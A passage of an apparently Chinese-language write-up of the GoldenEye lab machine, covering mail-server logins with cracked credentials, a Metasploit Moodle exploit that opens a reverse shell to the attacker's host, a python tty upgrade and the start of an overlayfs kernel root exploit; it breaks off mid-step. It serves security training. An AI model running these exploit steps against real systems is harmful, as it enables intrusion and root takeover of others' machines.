class="line"><span class="string">        by ubuntu (Postfix) with SMTP id 17C96454B1</span></span><br><span class="line"><span class="string">        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span></span><br><span class="line"><span class="string">Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;</span></span><br><span class="line"><span class="string">Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)</span></span><br><span class="line"><span class="string">From: root@ubuntu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#x27;</span>s related to security...even <span class="keyword">if</span> it<span class="string">&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;</span>ll get the change order escalated without much hassle :)</span><br><span class="line"></span><br><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And <span class="keyword">if</span> you didn<span class="string">&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span></span><br><span class="line"><span class="string">**Make sure to edit your host file since you usually work remote off-network....</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Since you&#x27;</span>re a Linux user just point this servers IP to severnaya-station.com <span class="keyword">in</span> /etc/hosts.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">好的，娜塔琳，我有一个新学生要给你。由于这是一个新系统，如果您发现任何配置问题，请让我或鲍里斯知道，尤其是它与安全性有关...即使不是，只需以“安全性”为幌子输入...它会毫不费力地升级变更单 :)</span><br><span class="line"></span><br><span class="line">好的，用户信用是：</span><br><span class="line"></span><br><span class="line">用户名：xenia</span><br><span class="line">密码：RCP90rulez！</span><br><span class="line"></span><br><span class="line">Boris 验证了她是一个有效的承包商，所以只需创建帐户，好吗？</span><br><span class="line"></span><br><span class="line">如果您没有外部内部域的 URL：severnaya-station.com/gnocertdir</span><br><span class="line">**请确保编辑您的主机文件，因为您通常在远程离线工作......</span><br><span class="line"></span><br><span class="line">由于您是 Linux 用户，只需将此服务器 IP 指向 /etc/hosts 中的 severnaya-station.com</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">信息</span><br><span class="line">url:severnaya-station.com/gnocertdir</span><br><span class="line">username:xenia</span><br><span class="line">password:RCP90rulez!</span><br></pre></td></tr></table></figure><p>给项目地址绑定host</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661233375-d5adfcd1b3d055de6ca3b0e8804e9c13.webp" alt="image-20220823134252509"></p><h3 id="访问severnaya-station-com"><a href="http://xn--severnaya-station-0173ci33h.com">访问severnaya-station.com</a></h3><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661233946-f41bd8b80a48c13e1b4b63b55306d5eb.webp" alt="image-20220823135223312"></p><p>这是一个php站点  moodle cms</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661238624-c9bb99ee8195bd0f9a0f764fac5d43c3.webp" alt="image-20220823151021217"></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661238845-e3f8d89a36795ccff408981f7211b36e.webp" alt="image-20220823151402552"></p><p>发现email username  doak</p><p>然后继续hydra爆破</p><p>得到密码 goat</p><h4 id="nc登录doak">nc登录doak</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># nc 10.0.0.101 55007</span></span><br><span class="line">+OK GoldenEye POP3 Electronic-Mail System</span><br><span class="line">user doak</span><br><span class="line">+OK</span><br><span class="line">pass goat</span><br><span class="line">+OK Logged <span class="keyword">in</span>.</span><br><span class="line">list</span><br><span class="line">+OK 1 messages:</span><br><span class="line">1 606</span><br><span class="line">.</span><br><span class="line">retr 1</span><br><span class="line">+OK 606 octets</span><br><span class="line">Return-Path: &lt;doak@ubuntu&gt;</span><br><span class="line">X-Original-To: doak</span><br><span class="line">Delivered-To: doak@ubuntu</span><br><span class="line">Received: from doak (localhost [127.0.0.1])</span><br><span class="line">        by ubuntu (Postfix) with SMTP <span class="built_in">id</span> 97DC24549D</span><br><span class="line">        <span class="keyword">for</span> &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;</span><br><span class="line">Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)</span><br><span class="line">From: doak@ubuntu</span><br><span class="line"></span><br><span class="line">James,</span><br><span class="line">If you<span class="string">&#x27;re reading this, congrats you&#x27;</span>ve gotten this far. You know how tradecraft works right?</span><br><span class="line"></span><br><span class="line">Because I don<span class="string">&#x27;t. Go to our training site and login to my account....dig until you can exfiltrate further information......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">username: dr_doak</span></span><br><span class="line"><span class="string">password: 4England!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.</span></span><br></pre></td></tr></table></figure><p>得到用户密码<mark class="hl-label default">dr_doak:4England!</mark> </p><h4 id="登录dr-dock账号">登录dr_dock账号</h4><p>发现特殊文件</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661240187-da02868ad646f9507a5e5688c3c4bf2c.webp" alt="image-20220823153624358"></p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661240222-4d25395bbfce1a25cf0b5af3f7a77d1b.webp" alt="image-20220823153659039"></p><p>发现url  /dir007key/for-007.jpg</p><h4 id="下载图片分析">下载图片分析</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># wget http://severnaya-station.com/dir007key/for-007.jpg</span></span><br><span class="line">--2022-08-23 15:38:48--  http://severnaya-station.com/dir007key/for-007.jpg</span><br><span class="line">正在解析主机 severnaya-station.com (severnaya-station.com)... 10.0.0.101</span><br><span class="line">正在连接 severnaya-station.com (severnaya-station.com)|10.0.0.101|:80... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：14896 (15K) [image/jpeg]</span><br><span class="line">正在保存至: “for-007.jpg”</span><br><span class="line"></span><br><span class="line">for-007.jpg                   100%[=================================================&gt;]  14.55K  --.-KB/s  用时 0s</span><br><span class="line"></span><br><span class="line">2022-08-23 15:38:48 (111 MB/s) - 已保存 “for-007.jpg” [14896/14896])</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/100project/001]</span><br><span class="line">└─<span class="comment"># exiftool for-007.jpg</span></span><br><span class="line">ExifTool Version Number         : 12.44</span><br><span class="line">File Name                       : for-007.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 15 kB</span><br><span class="line">File Modification Date/Time     : 2018:04:25 08:40:02+08:00</span><br><span class="line">File Access Date/Time           : 2022:08:23 15:39:33+08:00</span><br><span class="line">File Inode Change Date/Time     : 2022:08:23 15:38:48+08:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">X Resolution                    : 300</span><br><span class="line">Y Resolution                    : 300</span><br><span class="line">Exif Byte Order                 : Big-endian (Motorola, MM)</span><br><span class="line">Image Description               : eFdpbnRlcjE5OTV4IQ==</span><br><span class="line">Make                            : GoldenEye</span><br><span class="line">Resolution Unit                 : inches</span><br><span class="line">Software                        : linux</span><br><span class="line">Artist                          : For James</span><br><span class="line">Y Cb Cr Positioning             : Centered</span><br><span class="line">Exif Version                    : 0231</span><br><span class="line">Components Configuration        : Y, Cb, Cr, -</span><br><span class="line">User Comment                    : For 007</span><br><span class="line">Flashpix Version                : 0100</span><br><span class="line">Image Width                     : 313</span><br><span class="line">Image Height                    : 212</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</span><br><span class="line">Image Size                      : 313x212</span><br><span class="line">Megapixels                      : 0.066</span><br></pre></td></tr></table></figure><p>发现描述里的内容有点特殊,有两个==号 猜测可能经过base64编码</p><p>尝试base64解码</p><p>得到<mark class="hl-label default">xWinter1995x!</mark> </p><h4 id="使用得到的密码进行admin登录">使用得到的密码进行admin登录</h4><p>登录成功</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661240985-40d336430f93162907c0b9d67679a603.webp" alt="image-20220823154942844"></p><h3 id="信息搜集汇总">信息搜集汇总</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ip:10.0.0.101</span><br><span class="line">host:severnaya-station.com</span><br><span class="line">posts:25,80,55006,5007</span><br><span class="line"></span><br><span class="line">cms:2.2.3 moodle</span><br><span class="line"></span><br><span class="line">账户密码</span><br><span class="line">url: 10.0.0.101 55007</span><br><span class="line">boris:secret1!</span><br><span class="line">natalya:bird</span><br><span class="line">doak:goat</span><br><span class="line"></span><br><span class="line">url:severnaya-station.com/gnocertdir</span><br><span class="line">xenia:RCP90rulez!</span><br><span class="line">dr_doak:4England!</span><br><span class="line">admin:xWinter1995x!</span><br></pre></td></tr></table></figure><h2 id="漏洞利用">漏洞利用</h2><p>已知 cms为2.2.3 moodle</p><p>谷歌搜索moodle 2.2.3 exploit</p><p>在exploit-db找到  cve2013-3630</p><h4 id="使用msf进行漏洞利用">使用msf进行漏洞利用</h4><h5 id="搜索exp">搜索exp</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># msfconsole</span></span><br><span class="line"></span><br><span class="line">                                   ____________</span><br><span class="line"> [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| <span class="variable">$a</span>,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]</span><br><span class="line"> [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| <span class="variable">$S</span>`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]</span><br><span class="line"> [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]</span><br><span class="line"> [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]</span><br><span class="line"> [% |        ||  -__||   _||  _  ||  ,,aS$<span class="string">&quot;&quot;</span>`  ||  _  ||  ||  _  ||  ||   _|%%]</span><br><span class="line"> [% |__|__|__||_____||____||___._||%<span class="variable">$P</span><span class="string">&quot;`       ||   __||__||_____||__||____|%%]</span></span><br><span class="line"><span class="string"> [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `&quot;</span>a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]</span><br><span class="line"> [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`<span class="string">&quot;a,$<span class="variable">$__</span>|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]</span></span><br><span class="line"><span class="string"> [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `&quot;</span>$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]</span><br><span class="line"> [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.2.11-dev                          ]</span><br><span class="line">+ -- --=[ 2233 exploits - 1179 auxiliary - 398 post       ]</span><br><span class="line">+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: After running db_nmap, be sure to</span><br><span class="line">check out the result of hosts and services</span><br><span class="line"></span><br><span class="line">msf6 &gt; search moodle</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                                          Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                                          ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/http/moodle_admin_shell_upload                  2019-04-28       excellent  Yes    Moodle Admin Shell Upload</span><br><span class="line">   1  exploit/multi/http/moodle_spelling_binary_rce                 2013-10-30       excellent  Yes    Moodle Authenticated Spelling Binary RCE</span><br><span class="line">   2  exploit/multi/http/moodle_spelling_path_rce                   2021-06-22       excellent  Yes    Moodle SpellChecker Path Authenticated Remote Command Execution</span><br><span class="line">   3  exploit/multi/http/moodle_teacher_enrollment_priv_esc_to_rce  2020-07-20       good       Yes    Moodle Teacher Enrollment Privilege Escalation to RCE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/moodle_teacher_enrollment_priv_esc_to_rce</span><br></pre></td></tr></table></figure><p>也可以搜索 cve 2013-3630</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search cve 2013-3630</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                           Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/http/moodle_spelling_binary_rce  2013-10-30       excellent  Yes    Moodle Authenticated Spelling Binary RCE</span><br><span class="line">   1  exploit/multi/http/moodle_spelling_path_rce    2021-06-22       excellent  Yes    Moodle SpellChecker Path Authenticated Remote Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/moodle_spelling_path_rce</span><br></pre></td></tr></table></figure><h5 id="使用exp">使用exp</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole                        ---进入MSF框架攻击界面</span><br><span class="line">search moodle                     ---查找 moodle类型 攻击的模块</span><br><span class="line">use 0                             ---调用0  exploit/multi/http/moodle_cmd_exec调用攻击脚本</span><br><span class="line">set username admin                ---设置用户名：admin</span><br><span class="line">set password xWinter1995x!        ---设置密码：xWinter1995x!</span><br><span class="line">set rhost severnaya-station.com   ---设置：rhosts severnaya-station.com</span><br><span class="line">set targeturi /gnocertdir         ---设置目录： /gnocertdir</span><br><span class="line">set payload cmd/unix/reverse      ---设置payload：cmd/unix/reverse</span><br><span class="line">set lhost 10.0.0.3           ---设置：lhost 10.0.0.3（需要本地IP）</span><br><span class="line">run  ----执行命令</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use 0</span><br><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/moodle_spelling_binary_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD                    <span class="built_in">yes</span>       Password to authenticate with</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      <span class="built_in">yes</span>       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using</span><br><span class="line">                                         -Metasploit</span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SESSKEY                     no        The session key of the user to impersonate</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /moodle/         <span class="built_in">yes</span>       The URI of the Moodle installation</span><br><span class="line">   USERNAME   admin            <span class="built_in">yes</span>       Username to authenticate with</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; <span class="built_in">set</span> password xWinter1995x!</span><br><span class="line">password =&gt; xWinter1995x!</span><br><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; <span class="built_in">set</span> rhost severnaya-station.com</span><br><span class="line">rhost =&gt; severnaya-station.com</span><br><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; <span class="built_in">set</span> targeturi /gnocertdir</span><br><span class="line">targeturi =&gt; /gnocertdir</span><br><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; <span class="built_in">set</span> payload cmd/unix/reverse</span><br><span class="line">payload =&gt; cmd/unix/reverse</span><br><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; <span class="built_in">set</span> lhost 10.0.0.3</span><br><span class="line">lhost =&gt; 10.0.0.3</span><br><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 10.0.0.3:4444</span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to <span class="built_in">disable</span>)</span><br><span class="line">[+] The target appears to be vulnerable. Exploitable Moodle version 2.2 detected</span><br><span class="line">[*] Authenticating as user: admin</span><br><span class="line">[*] Getting session key to update spellchecker <span class="keyword">if</span> no session key was specified</span><br><span class="line">[*] Updating spellchecker to use the system aspell</span><br><span class="line">[*] Triggering payload</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure><p>发现没有运行成功</p><p>查看exp需要pspellshell</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_2/1661483641-84ce090de92d71a51f3a911c8db06d78.webp" alt="image-20220826111358749"></p><p>使用admin登录<a href="http://severnaya-station.com/gnocertdir">http://severnaya-station.com/gnocertdir</a></p><p>在settings-&gt;Site administration-&gt;Plugins-&gt;Text editors-&gt;YinyMCE HTML editor处</p><p>修改speel engine 为pspellshell</p><p>然后保存 msf执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/http/moodle_spelling_binary_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 10.0.0.3:4444</span><br><span class="line">[*] Running automatic check (<span class="string">&quot;set AutoCheck false&quot;</span> to <span class="built_in">disable</span>)</span><br><span class="line">[+] The target appears to be vulnerable. Exploitable Moodle version 2.2 detected</span><br><span class="line">[*] Authenticating as user: admin</span><br><span class="line">[*] Getting session key to update spellchecker <span class="keyword">if</span> no session key was specified</span><br><span class="line">[*] Updating spellchecker to use the system aspell</span><br><span class="line">[*] Triggering payload</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: <span class="built_in">echo</span> 7YPpFMOnfF8gG8B3;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: <span class="string">&quot;7YPpFMOnfF8gG8B3\r\n&quot;</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line"><span class="built_in">whoami</span>[*] Command shell session 2 opened (10.0.0.3:4444 -&gt; 10.0.0.101:47575) at 2022-08-26 11:16:45 +0800</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data</span><br></pre></td></tr></table></figure><p>然后执行tty 因为获得的权限无框架：执行</p><p>查看有没有安装python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whereis python</span><br><span class="line">python: /usr/bin/python3.4m /usr/bin/python /usr/bin/python3.4 /usr/bin/python2.7 /etc/python /etc/python3.4 /etc/python2.7 /usr/lib/python3.4 /usr/lib/python2.7 /usr/bin/X11/python3.4m /usr/bin/X11/python /usr/bin/X11/python3.4 /usr/bin/X11/python2.7 /usr/local/lib/python3.4 /usr/local/lib/python2.7 /usr/share/python /usr/share/man/man1/python.1.gz</span><br></pre></td></tr></table></figure><p>使用python 获得tty shell</p><p><code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code></p><p>查看内核版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ <span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@01:/tmp$ <span class="built_in">uname</span> -a</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">Linux 01 3.13.0-32-generic <span class="comment">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">www-data@01:/tmp$</span><br></pre></td></tr></table></figure><h2 id="提权">提权</h2><p>已知内核版本为3.13.0</p><p>搜索3.13.0 提权</p><p>在exploit-db找到 cve 2015-1328</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><br><span class="line">CVE-2015-1328 / ofs.c</span><br><span class="line">overlayfs incorrect permission handling + FS_USERNS_MOUNT</span><br><span class="line"></span><br><span class="line">user@ubuntu-server-1504:~$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux ubuntu-server-1504 3.19.0-18-generic <span class="comment">#18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">user@ubuntu-server-1504:~$ gcc ofs.c -o ofs</span><br><span class="line">user@ubuntu-server-1504:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(user) gid=1000(user) <span class="built_in">groups</span>=1000(user),24(cdrom),30(dip),46(plugdev)</span><br><span class="line">user@ubuntu-server-1504:~$ ./ofs</span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads <span class="keyword">done</span></span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),24(cdrom),30(dip),46(plugdev),1000(user)</span><br><span class="line"></span><br><span class="line">greets to beist &amp; kaliman</span><br><span class="line">2015-05-24</span><br></pre></td></tr></table></figure><p>查看代码 需要使用gcc编译</p><p>查看有没有gcc环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@01:/tmp$ gcc</span><br><span class="line">gcc</span><br><span class="line">The program <span class="string">&#x27;gcc&#x27;</span> is currently not installed. To run <span class="string">&#x27;gcc&#x27;</span> please ask your administrator to install the package <span class="string">&#x27;gcc&#x27;</span></span><br></pre></td></tr></table></figure><p>没有 查看有没有cc环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@01:/tmp$ cc</span><br><span class="line">cc</span><br><span class="line">clang: error: no input files</span><br><span 